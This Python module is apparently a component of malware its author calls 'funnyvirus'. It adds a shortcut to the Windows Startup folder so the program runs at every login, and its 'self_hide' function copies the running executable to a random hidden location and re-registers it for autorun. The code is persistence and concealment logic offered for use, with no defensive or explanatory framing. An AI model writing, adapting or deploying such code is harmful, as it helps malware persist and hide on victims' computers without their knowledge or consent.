from win32com.client import Dispatch

from .pathfinder import *

import os
import shutil
import sys

AUTORUN_NAME = "funnyvirus.lnk"

scut_p = os.path.join(os.getenv("APPDATA"), os.path.join("Microsoft", "Windows", "Start Menu", "Programs", "Startup"))

def is_in_autorun():
    return AUTORUN_NAME in os.listdir(scut_p)

def autorun_add(path = None, name = None):
    if not AUTORUN_NAME in os.listdir(scut_p):
        shell = Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(os.path.join(scut_p, AUTORUN_NAME))
        shortcut.TargetPath = os.path.abspath(sys.executable if name == None else name)
        shortcut.WorkingDirectory = os.path.dirname(sys.executable) if path == None else path
        shortcut.save()

def self_hide():
    if is_in_autorun():
        os.remove(os.path.join(scut_p, AUTORUN_NAME))

    print(sys.executable)

    hide_dir = random_path()

    shutil.copy2(sys.executable, hide_dir)

    autorun_add(hide_dir, sys.executable)

    return hide_dir